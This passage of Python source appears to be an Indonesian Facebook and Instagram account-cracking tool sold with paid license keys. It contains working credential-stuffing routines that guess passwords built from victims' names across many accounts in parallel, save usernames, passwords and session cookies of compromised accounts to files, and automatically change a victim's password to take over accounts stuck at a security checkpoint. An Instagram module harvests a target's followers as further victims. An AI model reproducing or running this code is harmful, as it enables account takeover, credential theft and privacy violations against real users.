        sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik         '%(N,M,N)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print(f"\r {N}[{M}×{N}] akun sesi new")
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('results/OKE.txt', 'a').write(f" [✓] {user}|{pasw}|{coki}\n")
            print(f"\r  🎉{H} hore akunya tidak checkpoint{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengecek aplikasi...{N}");time.sleep(0.03)
            cek_apk(session,coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    print(f"\r  🎉{H} hore akunya tap yes{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "YayanGanteng:v"
                    print(f"\r  🎉{H} hore akunya tap yes{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print(' [%s!%s] opshh akunya terpasang autentikasi dua faktor :('%(M,N))
            else:
                open('results/ERROR.txt', 'a').write(f" [×] {user}|{pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f" [×] {user}|{pasw}\n")
            print(" %s[%s*%s] Terdapat %s Opsi "%(N,O,N,len(cek)))
        for opt in range(len(cek)):
            print(f" [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
    else:
        print(f"\r {N}[{M}!{N}] Kata sandi salah atau sudah diubah")
        open('results/INVALID-OK.txt', 'a').write(f" [×] {user}|{pasw}\n")

#UBAH PW
def ubah_pw(session,response,link2,user,mmk):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        print(f"\r {N}[{H}✓{N}] berhasil mengubah password menjadi:\n {N}[{H}✓{N}]{H} {user}|{''.join(mmk)}|{coki}{N}")
        open('results/TAB-YES.txt', 'a').write(f" [✓] {user}|{''.join(mmk)}|{coki}\n")
        cek_apk(session,coki)
# CEK APLIKASI YANG TERKAIT
def cek_apk(session,cookie):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
    else:
        for i in range(len(game)):
            print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
    else:
        for i in range(len(game)):
            print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#LOGIN KEY
def premium():
    os.system("clear")
    print("%s%s*%s %sADMIN TIDAK BERTANGGUNG JAWAB ATAS PENYALAHGUNAAN TOOLS INI%s"%(N,P,N,O,N))
    print("%s*%s %sUNTUK MENDAPATKAN COOKIES GUNAKAN TOOLS COOKIEDOUGH EKSTENSION YANG ADA DI KIWI BROWSER%s %sdownload browser kiwi di play store%s"%(P,N,O,N,H,N))
    print("%s*%s %sJIKA TIDAK MENGERTI MENGGUNAKAN TOOLS SILAHKAN HUBUNGI ADMIN DENGAN KETIK%s '%sADMIN%s'"%(P,N,O,N,H,N))
    print("%s*%s %sJIKA INGIN MENGGUNAKAN FREE USER SILAHKAN HUBUNGI ADMIN UNTUK MENDAPATKAN API KEY GRATIS%s %s1 day%s"%(P,N,O,N,H,N))
    print("%s*%s %s(ADMIN IS NOT RESPONSIBLE FOR ABUSE OF THIS TOOL)%s"%(P,N,O,N))
    print("%s*%s %sSCRIPT TELAH DI UPATE PADA TANGGAL%s %sSelasa 22 Februari 2022%s"%(P,N,O,N,H,N))
    memek = input("\n%s*%s %sapi key%s %s: %s"%(P,N,O,N,P,K))
    if memek == '':
        print("\n[!] jangan kosong bro");time.sleep(2);moch_yayan()
    elif memek in['admin','Admin','ADMIN']:
        jalan("\n %s* %sAnda akan di alihkan ke whatsapp..."%(O,H));time.sleep(0.03)
        exit(subprocess.Popen(["am","start","https://wa.me/"+requests.get("https://ymbf.yayanxd.my.id/no.txt").text.strip()+"?text=Hello! saya ingin menggunakan tools Brute"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
    elif memek in['beli','Beli','BELI']:
        beli_key()
    try:
        kontol = requests.get("https://hakiki-apikey.000webhostapp.com/chek.php?project=ngetes&apikey="+memek).json()
        kadaluarsa = kontol['expired']
        nama = kontol["username"]
        day,month,year = kadaluarsa.split(" ")
        month = bulan_key[month]
        open('license.txt', 'w').write(memek)
        jalan("\n%s*%s %sHall%s %s%s%s %sapikey anda masih berlaku sampai tanggal:%s %s%s %s %s%s, %ssilahkan gunakan dengan bijak.%s"%(P,N,O,N,H,nama,N,O,N,H,day,month,year,N,O,N));time.sleep(3)
        exit("%s!%s %sjalankan ulang perintah nya dengan ketik python new.py%s"%(M,N,O,N))
    except KeyError:
        print("\n%s%s!%s %sapi key%s %s%s%s %stidak terdaftar di website%s"%(N,M,N,O,N,M,memek,N,O,N));time.sleep(2);cok()

def get_license(integer):
    lis = list("abcdefghijklmnopqrstuvwxyz123456789")
    gets = [random.choice(lis) for _ in range(integer)]
    return "".join(gets).upper()

def beli_key():
    os.system("clear")
    digit = random.choice([20])
    digit = get_license(digit)
    banner()
    print("\n %s+%s %sYour key%s : %s%s%s"%(P,N,O,P,H,digit,N))
    print("""\n %s01%s %s Daftar premium key%s\n %s02%s %s Check harga premium%s\n %s00%s%s Exit%s"""%(P,N,O,N,P,N,O,N,M,N,O,N))
    print("%s---------------------------%s>%s>%s>"%(B,M,K,H))
    pil = input(" %s%s+%s choose %s:%s "%(N,P,O,M,H))
    while pil == "":
        print("\n %s%s×%s %sjangan kosong bro"%(N,M,N,O));time.sleep(2);beli_key()
    if pil == "1":
        print ("\n %s%s!%s %sNotice me: mana hari isi dengan angka jangan hurup%s\n"%(N,M,N,O,N))
        hari = input(" %s%s?%s mau order berapa hari %s:%s "%(N,M,O,M,H))
        nama = input(" %s%s?%s nama anda  %s:%s "%(N,M,O,M,H))
        mail = input(" %s%s?%s email anda %s:%s "%(N,M,O,M,H))
        exit(subprocess.Popen(["am","start","https://wa.me/"+requests.get("https://ymbf.yayanxd.my.id/no.txt").text.strip()+"?text=hello admin! tolong konfirmasi kode premium saya.\n* Nama  : "+nama+"\n* EMAIL : "+mail+"\n* KEY     : " +digit+"\n* ORDER : "+hari+"days"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
    elif pil == "2":
        cek_harga()
    elif pil == "0":
        cok()
    else:
        print("\n %s%s×%sninput yang bener"%(N,M,O));time.sleep(2);beli_key()

def cek_harga():
    print ("""
    %s*%s daftar harga Lisensi %s*%s\n
  %s>%s pembayaran via dana/pulsa %s<%s\n
 [%s1%s]%s 5K  (5  rb) Sehari%s
 [%s2%s]%s 25K (25 rb) minggu%s
 [%s3%s]%s 50K (50 rb) 1 bulan%s"""%(P,O,P,N,H,N,H,O,P,N,H,N,O,N,H,N,O,N,H,N))
    input("\n   %s[%s ENTER %s]%s "%(H,O,H,N));beli_key()

# MULAI CRACK
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self,id):
        self.id = id
        print(' %s+%s total id -> %s%s%s' %(P,O,M,len(self.id),N))
        ___yayanganteng___ = input(' %s?%s Ingin memakai kata sandi manual?%s[%sY%s/%sT%s]: '%(P,O,O,H,O,K,O))
        if ___yayanganteng___ in ('Y', 'y'):
            print('\n %s%s!%s %sgunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih%s'%(N,M,N,O,N))
            while True:
                pwek = input('\n %s?%s %smasukan kata sandi%s %s: %s'%(P,N,O,N,P,K))
                print(' %s*%s %scrack dengan sandi ->%s [ %s%s%s ]' % (P,N,O,N,M, pwek, N))
                if pwek == '':
                    print('\n %s%s×%s %sjangan kosong bro kata sandi nya%s'%(N,M,N,O,N))
                elif len(pwek)<=5:
                    print('\n %s%s×%s %skata sandi minimal 6 karakter%s'%(N,M,N,O,N))
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = input('\n %s*%s %smethod%s %s: %s'%(P,N,O,N,P,K))
                        if cin == '':
                            print('\n %s%s×%s %sjangan kosong bro%s'%(N,M,N,O,N));__yan__()
                        elif cin == '1':
                            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '2':
                            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '3':
                            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb__, kimochi, ysc)
                                    except: pass

                            hasil(ok,cp)
                        else:
                            print('\n %s[%s×%s] input yang bener'%(N,M,N));__yan__()
                    print('\n [ pilih method login - silahkan coba satu² ]\n')
                    print(' [%s1%s]. method API (fast)'%(O,N))
                    print(' [%s2%s]. method mbasic (slow)'%(O,N))
                    print(' [%s3%s]. method mobile (super slow)'%(O,N))
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print('\n [ pilih method login - silahkan coba satu² ]\n')
            print(' [%s1%s]. method API (fast)'%(O,N))
            print(' [%s2%s]. method mbasic (slow)'%(O,N))
            print(' [%s3%s]. method mobile (super slow)'%(O,N))
            self.__pler__()
        else:
            print('\n %s[%s×%s] y/t goblok!'%(N,M,N));self.plerr(id)

    def __api__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
                _kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _kontol, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'Anda Tidak Dapat Menggunakan Fitur Ini Sekarang' in response.text:
                sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik      '%(N,M,N)),
                loop+=1
                sys.stdout.flush()
                self.__api__()
            if 'session_key' in response.text and 'EAAA' in response.text:
                coki = ";".join(i["name"]+"="+i["value"] for i in send.json()["session_cookies"])
                print('\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,coki,N))
                wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r  %s* --> %s|%s                %s' % (K,user,pw,N))
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1

    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if 'c_user' in ses.cookies.get_dict().keys():
                coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print('\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,coki,N))
                wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r  %s* --> %s|%s                %s' % (K,user,pw,N))
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if 'c_user' in ses.cookies.get_dict().keys():
                coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print('\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,coki,N))
                wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r  %s* --> %s|%s                %s' % (K,user,pw,N))
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
    def __pler__(self):
        yan = input('\n [*] method : ')
        if yan == '':
            print('\n %s[%s×%s] jangan kosong bro'%(N,M,N));self.__pler__()
        elif yan in ('1', '01'):
            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        kirim.submit(self.__api__, uid, pwx)
                    except:
                        pass

            hasil(ok,cp)
        elif yan in ('2', '02'):
            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        kirim.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            hasil(ok,cp)
        elif yan in ('3', '03'):
            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        kirim.submit(self.__mfb__, uid, pwx)
                    except:
                        pass

            hasil(ok,cp)
        else:
            print('\n %s[%s×%s] input yang bener'%(N,M,N));self.__pler__()

############################ RESPONSE IG ###########################################
yan, status_foll, poll, cr, looping = [], [], [], [], 1
url_instagram = "https://www.instagram.com/"
user_agentz = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"]
urll = "https://www.instagram.com/"
url = "https://www.instagram.com/accounts/login/ajax/"
headerz = {"User-Agent": user_agentz}
headerz_api = {"User-Agent": user_agentz_api}
header = {}
param = {}
####################################################################################

###### CRACK KHUSUS IG #####
def proses():
    print('\n\n %s[%s+%s] hasil OK disimpan ke -> results/IG-OK-%s-%s-%s.txt'%(N,O,N,ha, op, ta));time.sleep(0.2)
    print(' [%s+%s] hasil CP disimpan ke -> results/IG-CP-%s-%s-%s.txt'%(O,N,ha, op, ta));time.sleep(0.2)
    print('\n [%s!%s] tekan ctrl+z di keyboard anda untuk menjeda proses crack\n'%(M,N));time.sleep(0.2)

# CEK COOKIE IG
def log_igeh():
    global cookie
    try:
        kontol = open("ig.txt", "r").read()
    except IOError:
        masuk_ig()
    else:
        url = "https://i.instagram.com/api/v1/friendships/39431798677/followers/?count=5"
        with requests.Session() as ses:
            try:
                otw = ses.get(url, cookies={"cookie": kontol}, headers=headerz_api)
                if "users" in json.loads(otw.content):
                    cookie = {"cookie": kontol}
                else:
                    print('\n %s[%s×%s] cookie invalid'%(N,M,N));time.sleep(2);os.system('rm -rf ig.txt');masuk_ig()
            except ValueError:
                print('\n %s[%s×%s] cookie invalid'%(N,M,N));time.sleep(2);os.system('rm -rf ig.txt');masuk_ig()

# MASUK IG
def masuk_ig():
    global cookie
    jalan("\n %s[%s+%s] Login menggunakan akun tumbal Instagram anda [%s+%s]"%(N,H,N,H,N))
    print(" [+]----------------------------------------------[+]");time.sleep(0.03)
    userr = input(' [%s?%s] username :%s '%(H,N,K))
    peweh = input('%s [%s?%s] password :%s '%(N,H,N,K))
    try:
        try:
            headerz = {"User-Agent": user_agentz}
            with requests.Session() as ses:
                scr = "https://www.instagram.com/"
                data = ses.get(scr, headers=headerz).content
                toket = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
            headerss = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": toket,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,}
            param = {"username": userr,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), peweh),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
            }
        except:
            header = {}
            param = {}
            pass
        with requests.Session() as ses:
            url = "https://www.instagram.com/accounts/login/ajax/"
            respon = ses.post(url, data=param, headers=headerss)
            data = json.loads(respon.content)
            _2 = respon.cookies.get_dict()
            if "userId" in str(data):
                for xxx in _2:
                    with open("ig.txt", "a") as simpan:
                        simpan.write(xxx+"="+_2[xxx]+";")
                masuk = open("ig.txt","r").read()
                cookie = {"ig.txt": masuk}
                jalan("\n %s[%s*%s] selamat cookies kamu valid"%(N,O,N));time.sleep(2)
                exit(" [%s!%s] jalankan ulang perintah nya dengan ketik python run.py"%(M,N))
            elif "checkpoint_url" in str(data):
                print('\n %s[%s!%s] opshh seperti akun anda terkena checkpoint:('%(N,M,N));masuk_ig()
            elif "Please wait" in str(data):
                print('\n %s[%s!%s] hidupkan mode pesawat 5 detik'%(N,M,N));masuk_ig()
            else:
                exit('\n %s[%s!%s] username/password salah'%(N,M,N));masuk_ig()
    except KeyboardInterrupt:
        print('\n [!] Masukan username atau password yang benar');masuk_ig()

# MENU IG
def menu_igeh():
    print('\n [%s1%s]. Crack Followers Publik'%(O,N));time.sleep(0.03)
    print(' [%s2%s]. Crack Pencarian Nama'%(O,N));time.sleep(0.03)
    print(' [%s3%s]. Cek Hasil Crack'%(O,N));time.sleep(0.03)
    print(' [%s0%s]. Kembali ke menu awal'%(M,N));time.sleep(0.03)
    pepek = input('\n [%s+%s] input : '%(H,N))
    if pepek in['']:
        print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);menu_igeh()
    elif pepek in['1','01']:
        pw = ""
        status = ""
        username = input('\n [%s•%s] Username target : '%(O,N))
        ingfo(username, pw, status)
        print('\n%s [%s1%s] Pengikut : %s%s'%(N,O,N,H,str(pengikut)))
        print('%s [%s2%s] Mengikuti: %s%s'%(N,O,N,H,str(mengikuti)))
        kuntul = input('\n %s[%s+%s] input : '%(N,H,N))
        limit = input(' %s[%s+%s] limit : '%(N,H,N))
        if kuntul in['']:
            print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);menu_igeh()
        elif kuntul in['1','01']:
            __followers__(cookie, idg, limit, kuntul)
            proses()
            peweh()
        elif kuntul in['2','02']:
            __followers__(cookie, idg, limit, kuntul)
            proses()
            peweh()
        else:
            print('\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,kuntul,N));time.sleep(2);menu_igeh()
    elif pepek in['2','02']:
        jalan('\n %s[%s+%s] Masukan nama yang mau anda cari. contoh : %sMark%s'%(N,O,N,H,N))
        user = input('\n [%s•%s] Masukan nama : '%(O,N))
